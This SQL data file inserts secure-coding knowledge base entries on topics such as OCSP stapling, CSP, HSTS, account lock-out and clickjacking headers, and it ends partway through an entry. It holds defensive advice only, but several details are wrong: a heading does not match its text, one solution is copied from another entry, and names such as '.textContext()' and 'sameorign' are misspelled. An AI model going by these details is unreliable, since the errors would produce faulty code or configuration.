INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Forward secrecy cyphersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEOCSP stapling, formally known as the TLS Certificate Status Request extension, is anNEWLINEalternative approach to the Online Certificate Status Protocol (OCSP) for checking theNEWLINErevocation status of X.509 digital certificates. It allows the presenter of aNEWLINEcertificate to bear the resource cost involved in providing OCSP responses by appendingNEWLINE("stapling") a time-stamped OCSP response signed by the CA to the initial TLS Handshake,NEWLINEeliminating the need for clients to contact the CANEWLINENEWLINE## Solution:NEWLINENEWLINEStapling basically means that the certificate holder queries the OCSP server themselves atNEWLINEregular intervals, obtaining a signed time-stamped OCSP response. When the site''s visitorsNEWLINEattempt to connect to the site, this response is included ("stapled") with the TLS/SSLNEWLINEHandshake via the Certificate Status Request extension response (note: the TLS client mustNEWLINEexplicitly include a Certificate Status Request extension in its ClientHello TLS/SSLNEWLINEhandshake message). While it may appear that allowing the site operator to controlNEWLINEverification responses would allow a fraudulent site to issue false verification for aNEWLINErevoked certificate, the stapled responses can''t be forged as they need to be directlyNEWLINEsigned by the certificate authority, not the server. If the client does not receive aNEWLINEstapled response, it will just contact the OCSP server by itself. However, if theNEWLINEclient receives an invalid stapled response, it will abort the connection. The onlyNEWLINEincreased risk of OCSP stapling is that the notification of revocation for a certificateNEWLINEmay be delayed until the last-signed OCSP response expires.NEWLINENEWLINEFor more detailed information about Specification, Deployment, and limitation visit:NEWLINEhttps://en.wikipedia.org/wiki/OCSP_staplingNEWLINE', 'OCSP stapling'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# STRIDENEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESTRIDE is a collective for a series of vulnerabilities your applications shouldNEWLINEcover in order to harden your applications security.NEWLINENEWLINESTRIDE stands for:NEWLINESpoofingNEWLINETamperingNEWLINERepudiationNEWLINEInformation DisclosureNEWLINEElevation of privilegeNEWLINENEWLINE## Solution:NEWLINENEWLINEIn the context of network security, a spoofing attack is a situation in which one personNEWLINEor program successfully masquerades as another by falsifying data and thereby gaining anNEWLINEillegitimate advantage. There are a lot of different types of spoofing you have to takeNEWLINEinto account for example: TCP/IP, Referrer, ID, or Email spoofing.NEWLINENEWLINEFor Tampering we recommend to read the following knowledge base items:NEWLINENEWLINE- Input validationNEWLINE- Input rejectionNEWLINE- Single input validation controlsNEWLINENEWLINEFor Repudiation we recommend to read the following knowledge base items:NEWLINENEWLINE- Repudiation attacksNEWLINENEWLINEFor information disclosure we recommend to read the following knowledge base items:NEWLINENEWLINE- Verbose error messagingNEWLINE- Session information is not stored server-sideNEWLINE- Sensitive information transmitted by unencrypted methodsNEWLINE- Enforce policies for sensitive data processingNEWLINE- Verify that the session id is never disclosedNEWLINE- Username enumerationNEWLINE- Differential analysisNEWLINENEWLINEFor Elevation of privilege we recommend to read the following knowledge base items:NEWLINENEWLINE- Authentication at a central locationNEWLINE- All authentication controls must fail securelyNEWLINE- Client-side authenticationNEWLINE- Re-authenticationNEWLINE- Privilege escalationNEWLINE- Principle of least privilegeNEWLINE- Authentication at a central locationNEWLINE', 'STRIDE'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# File inclusion attackNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe File Inclusion vulnerability allows an attacker to include a file, usually exploitingNEWLINEa "dynamic file inclusion" mechanisms implemented in the target application.NEWLINEThe vulnerability occurs due to the use of user-supplied input without proper validation.NEWLINENEWLINENEWLINEThis can lead to something as outputting the contents of the file, but depending on theNEWLINEseverity, it can also lead to:NEWLINENEWLINE* Code execution on the web serverNEWLINE* Code execution on the client-side such as JavaScript which can lead to other attacksNEWLINE  such as cross site scripting (XSS)NEWLINE* Denial of Service (DoS)NEWLINE* Sensitive Information DisclosureNEWLINENEWLINENEWLINELocal File Inclusion (also known as LFI) is the process of including files, that areNEWLINEalready locally present on the server, through the exploiting of vulnerable inclusionNEWLINEprocedures implemented in the application. This vulnerability occurs, for example, when aNEWLINEpage receives, as input, the path to the file that has to be included and this input isNEWLINEnot properly sanitized, allowing directory traversal characters (such as dot-dot-slash)NEWLINEto be injected. Although most examples point to vulnerable PHP scripts, we should keepNEWLINEin mind that it is also common in other technologies such as JSP, ASP and others.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe most effective solution to eliminate file inclusion vulnerabilities is to avoidNEWLINEpassing user-submitted input to any filesystem/framework API. If this is not possibleNEWLINEthe application can maintain a white list of files, that may be included by the page, andNEWLINEthen use an identifier (for example the index number) to access to the selected file.NEWLINEAny request containing an invalid identifier has to be rejected, in this way there isNEWLINEno attack surface for malicious users to manipulate the path.NEWLINE', 'File inclusion attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access managementNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever your application contains administration and management functions you shouldNEWLINEput on restrictions for visiting these functionalities in order to reduce an attackersNEWLINEattack vector on your services since they are not directly accessible for them.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that access to administration and management functions within the Web ServiceNEWLINEApplication is limited to web service administrators.NEWLINENEWLINEFor example, they could only be accessible from within a restricted source IP range.NEWLINE', 'Access management'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# JSON, XML schemaNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen adding schema''s to your JSON or XML files you have better control over whatNEWLINEtype of user-input can be supplied in your application. This dramatically decreases anNEWLINEattackers attack vector when implemented the right way. Nonetheless you should alwaysNEWLINEapply your own input validation and rejection as extra layer of defense. This approachNEWLINEis also desirable since you also want to do countering and logging on the usersNEWLINErequests and input.	 NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that XML or JSON schema are in place and verified before accepting input.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input rejectionNEWLINE- Input validationNEWLINE- Audit logsNEWLINE', 'JSON XML schema'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Limiting the size of user inputNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there is user-input supplied into your application you also want to limitNEWLINEthe size of the user-input to appropriate maximum lengths.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that XML or JSON schema are in place and verified before accepting input.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input rejectionNEWLINE- Input validationNEWLINE- Audit logsNEWLINE', 'Limiting user input size'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Parsing data exchange formatsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are parsing data exchange formats such as, XML, JSON, CSV, etc, youNEWLINEhave to make sure that whenever these data files contain malicious code this will not beNEWLINEexecuted by your application. You should also not solely depend on your parser to do allNEWLINEthe encoding and escaping for you since there could always be an edge case that doesNEWLINEexecute certain attacks.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWe highly recommend to do your own escaping, sanitizing, encoding on all data beforeNEWLINEentering your application. The risk also depend on the context of wherever you are puttingNEWLINEthis data into. So before you are doing any mutations with your data after getting it fromNEWLINEthe resources, make sure you have applied the right mitigations.NEWLINENEWLINEAlso another reason to build an extra layer of escaping, sanitizing, encoding routinesNEWLINEin your application is because of the logging you want to apply on the data.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input rejectionNEWLINE- Input validationNEWLINE- Audit logsNEWLINE', 'Parsing data  exchange formats'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Content security policy headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe main use of the content security policy header is to, detect, report, and rejectNEWLINEXSS attacks. The core issue in relation to XSS attacks is the browser''s inability toNEWLINEdistinguish between script that''s intended to be part of your application, and scriptNEWLINEthat''s been maliciously injected by a third-party.NEWLINENEWLINEWith the use of CSP(Content security policy) we can tell the browser which script is safeNEWLINEto execute and which scripts are most likely been injected by an attacker.NEWLINENEWLINE## Solution:NEWLINENEWLINEA best practice for implementing CSP in your application would be to externalize allNEWLINEjavascript within the web pages.NEWLINENEWLINESo this:NEWLINE    <script>NEWLINE      function doSomething() {NEWLINE        alert(''Something!'');NEWLINE      }NEWLINE	</script>NEWLINENEWLINE	<button onclick=''doSomething();''>foobar!</button>NEWLINENEWLINEMust become this:NEWLINE	<script src=''doSomething.js''></script>NEWLINE	<button id=''somethingToDo''>Let''s foobar!</button>NEWLINENEWLINEThe header for this code could look something like:NEWLINE    Content-Security-Policy: default-src''self''; object-src''none''; script-src''https://mycdn.com''NEWLINENEWLINESince it is not entirely realistic to implement all javascript on external pages we canNEWLINEapply sort of a cross site request forgery token to your inline javascript. This wayNEWLINEthe browser can again distinguish the difference between code which is part of theNEWLINEapplication against probable malicious injected code, in CSP this is called the ''nonce''.NEWLINEOf course this method is also very applicable on your existing code and designs.NEWLINENEWLINENow, to use this nonce you have to supply your inline script tags with the nonce attribute.NEWLINEFirstly, it''s important that the nonce changes for each response. Otherwise the nonceNEWLINEwould become guessable. So it should also contain a high entropy and should be hard toNEWLINEpredict. Similar to the operation of the CSRF tokens, the nonce becomes impossible forNEWLINEthe attacker to predict making it difficult to execute a successful XSS attack.NEWLINENEWLINEInline javascript example containing nonce:NEWLINE	<script nonce=sfsdf03nceI23wlsgle9h3sdd21>NEWLINE    <!-- Your javscript code -->NEWLINE    </script>NEWLINENEWLINEMatching header example:NEWLINE    Content-Security-Policy: script-src ''nonce-sfsdf03nceI23wlsgle9h3sdd21''NEWLINENEWLINEThere is a whole lot more to learn about the CSP header for in depth implementation inNEWLINEyour application. This knowledge base item just scratches the surface and it would beNEWLINEhighly recommended to gain more in depth knowledge about this powerful header.NEWLINENEWLINE## Very Important:NEWLINEWhen applying the CSP header, although it blocks XSS attacks. YourNEWLINEapplication still remains vulnerable to HTML and other code injections.NEWLINESo this is not a substitute for, validation, sanitizing and encoding of user-input.NEWLINE', 'Content security policy headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Safe javascript and jquery methodsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are supplying your javascript/jquery with data which is controlled by theNEWLINEuser, you should make sure this data is not supplied towards functions which couldNEWLINEinterpreted the supplied and parse input as code. This could lead to XSS and other codeNEWLINEinjections.NEWLINENEWLINE## Solution:NEWLINENEWLINEBelow we listed some safe functions for whenever it is needed to supply yourNEWLINEjavascript/jquery functions with user-input.NEWLINENEWLINEJQUERY functions:NEWLINE.txt();NEWLINE.val();NEWLINE.parse();NEWLINENEWLINEExample:NEWLINE	<script>NEWLINE	function myFunction() {NEWLINE		$( "p" ).text( "append user-input to paragrapgh safely" );NEWLINE	}NEWLINE	</script>NEWLINENEWLINEJavscript functions:NEWLINE.innerText();   <- not supported by firefoxNEWLINE.textContext(); <- not supported on I.E 8 and lowerNEWLINE.createTextNode();NEWLINE.value();NEWLINENEWLINEExample:NEWLINENEWLINE	<script>NEWLINE	function myFunction() {NEWLINE   		var t = document.createTextNode("append user-input to body safely");NEWLINE    	document.body.appendChild(t);NEWLINE	}NEWLINE	</script>NEWLINE', 'Safe javascript jquery methods'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Accessible non-parsed dynamic scriptsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEApplications often include files in other pages. When these files can be directlyNEWLINEapproached by normal users, the operation of the application can be traced because theNEWLINEsource code becomes available. This improves the possibility that the attacker discoversNEWLINEvulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways add the different types of extensions to the web-server handler to parse.NEWLINEThis way the file source cannot be viewed.NEWLINE', 'accessible non'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# WYSIWYG editorsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWYSIWYG editors can be a great risk to your web application since it allows directNEWLINEHTML as input to make the user perform styling on their submissions. This is why theNEWLINEeditor should be put under a strict sanitation protocol to prevent injections.NEWLINENEWLINEThe first thing to take into consideration whenever you want to use WYSIWYG editors onNEWLINEyour web application is to use as limited options as possible. Only the options whichNEWLINEare necessary for your applications intended operation should be applied. This decreasesNEWLINEthe attackers attack vector drastically and leaves less room for error in your WYSIWYGNEWLINEeditor in terms of your HTML sanitation.NEWLINENEWLINEWhen providing your web application with an WYSIWYG editor you should also take note thatNEWLINEmost people just want to use bullets, make text bold or underline some text. They mostlyNEWLINEdo not understand half the functionalities the editors are providing.NEWLINENEWLINE## Solution:NEWLINENEWLINEDownload a HTML sanitizer and configure it to your specific needs. When configuring the sanitizer make sureNEWLINEyou disable all unused components. The less options an attacker has to insert into your application the lessNEWLINEhis attack surface becomes. Also before implementing this HTML sanitizer on a production environment haveNEWLINEit first thoroughly examined by security testers since it is a very delicate function.NEWLINE', 'WYSIWYG editors'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# JSON parsingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe eval() function evaluates or executes an argument.NEWLINENEWLINEIf the argument is an expression, eval() evaluates the expression. If the argument is oneNEWLINEor more JavaScript statements, eval() executes the statements.NEWLINENEWLINEThis is exactly the reason why eval() should NEVER be used to parse JSON or otherNEWLINEformats of data which could possible contain malicious code.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEFor the purpose of parsing JSON we would recommend the use of the json.parse functionality.NEWLINEEven though this function is more trusted you should always build your own security checksNEWLINEand encoding routines around the json.parse before mutating the data or passing it on toNEWLINEa view to be displayed in your HTML.NEWLINE', 'Parsing JSON with Javscript'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Account lock-outNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll applications should contain the possibility to lock down accounts for whenever itNEWLINEdetects attacks by/on users. Also you should include options for both soft and hardNEWLINElock-out mechanisms.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESoft lock-out:NEWLINEThis can be a good option for protecting your users against brute force attacks.NEWLINEFor example, whenever the user enters a wrong password three times, the application couldNEWLINElock down the account for a minute in order to slow down the process of brute forcing hisNEWLINEpassword making it less profitable for the attacker to proceed. If u were to implementNEWLINEhard lock-out countermeasures for this example you would achieve a "Dos" by permanentlyNEWLINElocking out accounts.NEWLINENEWLINEHard lock-out:NEWLINEThis type of lockout should be applied whenever you detect a user attacking yourNEWLINEapplication and counter him by means of permanently locking out his account until aNEWLINEresponse team had time to do their forensics. After this process you can decide toNEWLINEgive the user back his account or take further legal actions against him.NEWLINEThis type of approach prevents the attacker from further penetrating your applicationNEWLINEand infrastructure.NEWLINENEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- Audit logsNEWLINE- Privilege based authenticationNEWLINE', 'Account lockout'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XML AttacksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are using XML in your application there are a few possibilities forNEWLINEinjections depending on how you are applying XML in your system.NEWLINENEWLINEExtensible Markup Language (XML) is a markup language that defines a set of rules forNEWLINEencoding documents in a format which is both human-readable and machine-readable. It isNEWLINEdefined by the W3C''s XML 1.0 Specification and by several other related specifications,NEWLINEall of which are free open standards.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEItems listed below are recommended to read whenever you are planning to use XML in yourNEWLINEapplication.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- XML injectionNEWLINE- External DTD parsingNEWLINE- XSLT injectionsNEWLINE- XPath injectionsNEWLINE- XXE injectionsNEWLINE', 'XML'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Centralized place for security controlsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever security controls do not have a centralized implementation there is a highNEWLINEprobability for bugs or security issues being hidden into your application due to the lossNEWLINEof abstraction and duplication.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all your different type of security controls have a centralized place of implementation.NEWLINEAlso verify that error handling logic in security controls denies access by default.NEWLINE', 'centralized security controls'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Separated data, controller, display layersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe application should separate data, controller, and display layers in order to make yourNEWLINEapplication more clear and understandable in terms of abstraction due to separation.NEWLINENEWLINEWhenever your application is more organized and abstracted it is much easier to implementNEWLINEless flawed security controls.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure your different type of data layers are separated in your application.NEWLINENEWLINEThe separation of these different layers is also know as a design pattern which goesNEWLINEby the name MVC (model, view, controller).NEWLINE', 'data controller display layer sepperation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Proven authentication mechanismsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever your application has the option for users to authenticate themselvesNEWLINEyour method should be "proven" and secure in the sense of that:NEWLINENEWLINE1. it should comply to some security standards/guidelinesNEWLINE2. Before implementing authentication on a live environment it has to be pentested/audited byNEWLINE   professionals.NEWLINENEWLINE## Solution:NEWLINENEWLINEThere are some general guidelines in order to ensure your authentication mechanismNEWLINEis a "proven" one in order to harden your application against attackers.NEWLINEThese guidelines are listed in the following knowledgebase item:NEWLINENEWLINE- Access control patternNEWLINE', 'proven authentication mechanisms'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Administrative interfaces are not accessible to untrusted partiesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever it is not necessary for administrative pages to be publicly accessible theseNEWLINEpages should have restricted access for users. Whenever these pages are secluded from the restNEWLINEof the application in terms of accessibility this could reduce the attack vector of malicious users.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe first solution is to grant access only from a certain source IP range to theNEWLINEadministrative interface. If that solution would not be possible than it is always recommendedNEWLINEto enforce a step-up or adaptive authentication for logging in into the administrative interface.NEWLINENEWLINERecommended knowledgebase item:NEWLINENEWLINE- Step up or adaptive authenticationNEWLINE', 'administrative interfaces'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Concurrent session handlingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEYou should limit and keep track of all the different active concurrent sessions.NEWLINEWhenever the application discovers concurrent sessions it should always notify the userNEWLINEabout this and should give him the opportunity to end the other sessions.NEWLINENEWLINEWith this defense in place it becomes harder for attackers to hijack a users session sinceNEWLINEthey will be notified about concurrent sessions.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe application should keep track and limit all the granted sessions.NEWLINEIt should store your users IP address, session id and user id. After storing these credentialsNEWLINEit should do regular checks to see if there are:NEWLINENEWLINE1. Multiple active sessions linked to same user idNEWLINE2. Multiple active sessions from different locationsNEWLINE3. Limit and destroy sessions if they become concurrent.NEWLINENEWLINEIf so, the user should be notified and given the opportunity to end the other sessions.NEWLINENEWLINEA best practice would be to create a function which summarizes all the different active sessionsNEWLINEwith the opportunity to terminate them at any given time.NEWLINENEWLINEAs an extra layer of protection the user should also be prompted with the option to terminate allNEWLINEactive sessions whenever he:NEWLINENEWLINE1. changes his passwordNEWLINE2. re-authenticatesNEWLINE3. does step up or adaptive authenticationNEWLINENEWLINEAlong with the renewal of the session identifier in these steps you now have full hardened defenses againstNEWLINEsession hijacking attacks.NEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- Session hijackingNEWLINE- Session fixationNEWLINE', 'concurrent session handling'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Auto escaping technology NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESome frameworks/templates have the option to auto-escape all incoming user-input to harmlessNEWLINEencoded data in order to prevent attacks. However, this auto-escaping functionality is alsoNEWLINEoptional to be disabled. Whenever this auto-escaping function has been disabled your applicationNEWLINEmight be vulnerable to attacks like XSS.NEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever auto-escaping functionality in your application has been disabled for whatever reason, youNEWLINEshould make sure there is other protection in place like a HTML sanitizer in order toNEWLINEprevent attackers from injecting malicious code into your application.NEWLINE', 'Auto escaping technology'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include anti-caching headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAnti-caching headers have the ability to tell the browser,NEWLINEcomputer and proxies what information they may or may not store on the intermediate mediaNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThese headers are also known as the: Cache-control: no-store,no-cache and provideNEWLINEprotection of sensitive information when implemented in the application or web-server.NEWLINENEWLINERightly configured anti caching headers will look like the following as a responseNEWLINENEWLINE	Expires: Tue, 03 Jul 2001 06:00:00 GMTNEWLINE	Last-Modified: {now} GMTNEWLINE	Cache-Control: no-store, no-cache, must-revalidate, max-age=0NEWLINE	Cache-Control: post-check=0, pre-check=0NEWLINE	Pragma: no-cacheNEWLINE', 'Include anti'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client side storageNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAlso known as Offline Storage, Web Storage. Underlying storage mechanism may vary from oneNEWLINEuser agent to the next. In other words, any authentication your application requires canNEWLINEbe bypassed by a user with local privileges to the machine on which the data is stored.NEWLINETherefore, it''s recommended not to store any sensitive information in local storage.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that authenticated data is cleared from client storage, such as the browser DOM, after theNEWLINEsession is terminated. This also goes for other session and local storage information which couldNEWLINEassist an attacker launching an successful attack.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- HTML5 cachingNEWLINE', 'Client side storage'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Log rotation and separationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELog separation is indispensable in order to prevent it from either radically downgrading yourNEWLINEapplication its performance or even causing a Denial of service because the server becomesNEWLINEunavailable due to the flooding of logs.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINELog rotation is an automated process used in system administration in which dated logNEWLINEfiles are archived. Servers which run large applications, such as LAMP stacks, oftenNEWLINElog every request: in the face of bulky logs, log rotation is a way to limit the totalNEWLINEsize of the logs while still allowing analysis of recent events.NEWLINENEWLINELog separation basically means that you have to store your log files on a different partitionNEWLINEas where your OS/application is running on in order to avert a Denial of service attack or the downgradingNEWLINEof your application its performance.NEWLINE', 'Log rotation and seperation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTP strict transport securityNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specifiedNEWLINEby a web application through the use of a special response header. Once a supported browserNEWLINEreceives this header that browser will prevent any communications from being sent overNEWLINEHTTP to the specified domain and will instead send all communications over HTTPS. It alsoNEWLINEprevents HTTPS click through prompts on browsers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESimple example, using a long (1 year) max-age:NEWLINE    Strict-Transport-Security: max-age=31536000NEWLINENEWLINEIf all present and future subdomains will be HTTPS:NEWLINE    Strict-Transport-Security: max-age=31536000; includeSubDomainsNEWLINENEWLINERecommended: If the site owner would like their domain to be included in the HSTS preload listNEWLINEmaintained by Chrome (and used by Firefox and Safari), then use:NEWLINE    Strict-Transport-Security: max-age=31536000; includeSubDomains; preloadNEWLINENEWLINEThe ''preload'' flag indicates the site owner''s consent to have their domain preloaded. The site ownerNEWLINEstill needs to then go and submit the domain to the list.NEWLINENEWLINEThere is still a window where a user who has a fresh install, or who wipes out their local state,NEWLINEis vulnerable. This is due to the fact that the browser is not yet aware of the fact if the applicationNEWLINEthe it is trying to connect to supports HSTS. Whenever you are added to the preload list,NEWLINEthe application its preference is hard-coded into the browser and all first initial connections willNEWLINEalways be made by HTTPS.NEWLINENEWLINE## CAUTION: NEWLINESite owners can use HSTS to identify users without cookies. This can lead to a significantNEWLINEprivacy leak.NEWLINENEWLINECookies can be manipulated from sub-domains, so omitting the include "includeSubDomains"NEWLINEoption permits a broad range of cookie-related attacks that HSTS would otherwise preventNEWLINEby requiring a valid certificate for a subdomain. Ensuring the "Secure Flag" is set on allNEWLINEcookies will also prevent, some, but not all, of the same attacks.NEWLINE', 'HTTP strict transport security'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# API responses security headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThere are some security headers which should be properly configured in order to protect some API callbacks against Reflective File Download and other type of injections.NEWLINENEWLINEAlso check that the API response is not dynamic, if so use input validation and encoding in order to prevent XSS and Same origin method execution attacks.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all API responses contain X-Content-Type-Options: nosniff and Content-Disposition: attachment; filename="api.json" (or other appropriate filename for the content type).NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Include X content type options headerNEWLINE- RFD and file download injectionsNEWLINE- Same origin method executionNEWLINE', 'API resonses security headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client side technologies not supported natively via W3C browser standardsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen using unsupported client side technologies which are not supported natively viaNEWLINEW3C browser standards. Your application could be open to different types of attacks.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not use Flash, Active-X, Silverlight, NACL, client-side Java or other client side technologiesNEWLINEnot supported natively via W3C browser standards.NEWLINE', 'Do not support untrusted client side technologies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Signed message payloadsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn order to establish trust between two communicating party''s such as servers and clientsNEWLINEthere message payload should be signed by means of public/private key method. This builds trustNEWLINEand makes it harder for attackers to impersonate different users.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that a message payload is signed to ensure reliable transport between client and service.NEWLINE', 'Signed message payloads'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Hardware key vaultNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEKeys should remain in a protected key vault at all times. In particular, ensure that thereNEWLINEis a gap between the threat vectors that have direct access to the data and the threatNEWLINEvectors that have direct access to the keys. This implies that keys should not be storedNEWLINEon the application or web server (assuming that application attackers are part of theNEWLINErelevant threat model).NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all consumers of cryptographic services do not have direct access to key material.NEWLINEIsolate cryptographic processes, including master secrets and consider the use of a hardware key vault (HSM).NEWLINE', 'Hardware key vault'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SOAP based web services compliant with (WS-I) Basic ProfileNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESimple Soap Binding Profile is a specification from the Web Services Interoperability industry consortium. ItNEWLINEis intended as a support profile for the WS-I Basic Profile. This profile defines the way WSDLNEWLINEdocuments are to bind operations to a specific transport protocol SOAP.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the SOAP based web services are making use of the WS-I Basic profile.NEWLINENEWLINESource:NEWLINEhttp://www.ws-i.org/Profiles/SimpleSoapBindingProfile-1.0.htmlNEWLINE', 'SOAP basic profile'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Strong Crypto through all the certificate hierarchyNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you have an offline PKI setup you need to have solid strong crypto layers.NEWLINEAn attacker will look for weak chains in the hierarchy and abuse them when found.NEWLINEThis can lead to MiTM attacks and impact the 3 security pillars C.I.A.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that only strong algorithms, ciphers, and protocols are used, through all the certificate hierarchy,NEWLINEincluding root and intermediary certificates of your selected certifying authority.NEWLINENEWLINEBecause this is always in flux we recommend to use the SSLlabs free test:NEWLINENEWLINEhttps://www.ssllabs.com/ssltest/NEWLINENEWLINEThese TLS hardening recommendations can then be applied on all servers.NEWLINE', 'CRYPTO CA hierachy'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Build and deploy in a secure fashionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEUsing build platforms on premise or as a service is one of the core components in a SDLC.NEWLINEThese build and deploy servers are sometimes not perfect for performing secure builds or deploys.NEWLINEThis is because the lack of hardening of the OS for security improvements where the applicationNEWLINEcould also benefit from this hardening. Also the access of third party services can lead toNEWLINEcompromise of the secrets or integrity of the code of the application.NEWLINENEWLINE## Solution:NEWLINENEWLINEBuilding you application should always be done on a server that you trust, you are in control andNEWLINEhas the latest security patches and hardening configured. For deploying the application the sameNEWLINErules apply, also think about what type of third party services can access the code or modify it.NEWLINECreating scripts to monitor for bad behavior of a third party service can be an option as an extraNEWLINEquality control check.NEWLINE', 'Build Deploy secure'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Include anti clickjacking headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEClickjacking, also known as a "UI redress attack", is when an attacker uses multipleNEWLINEtransparent or opaque layers to trick a user into clicking on a button or link on anotherNEWLINEpage when they were intending to click on the top level page. Thus, the attacker isNEWLINE"hijacking" clicks meant for their page and routing them to another page, most likelyNEWLINEowned by another application, domain, or both.NEWLINENEWLINEUsing a similar technique, keystrokes can also be hijacked. With a carefully craftedNEWLINEcombination of stylesheets, iframes, and text boxes, a user can be led to believe theyNEWLINEare typing in the password to their email or bank account, but are instead typing into anNEWLINEinvisible frame controlled by the attacker.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETo avoid your application from being clickjacked you can add the X-frame-Options headerNEWLINEto your application. These headers can be configured as:NEWLINENEWLINE    X-frame-Options: denyNEWLINENEWLINEThe page cannot be displayed in a frame, regardless of the site attempting to do so.NEWLINENEWLINE    X-Frame-Options: sameorign  NEWLINENEWLINEThe page can only be displayed in a frame on the same origin as the page itself.NEWLINENEWLINE    X-Frame-Options: ALLOW-FROM uriNEWLINENEWLINEThe page can only be displayed in a frame on the specified 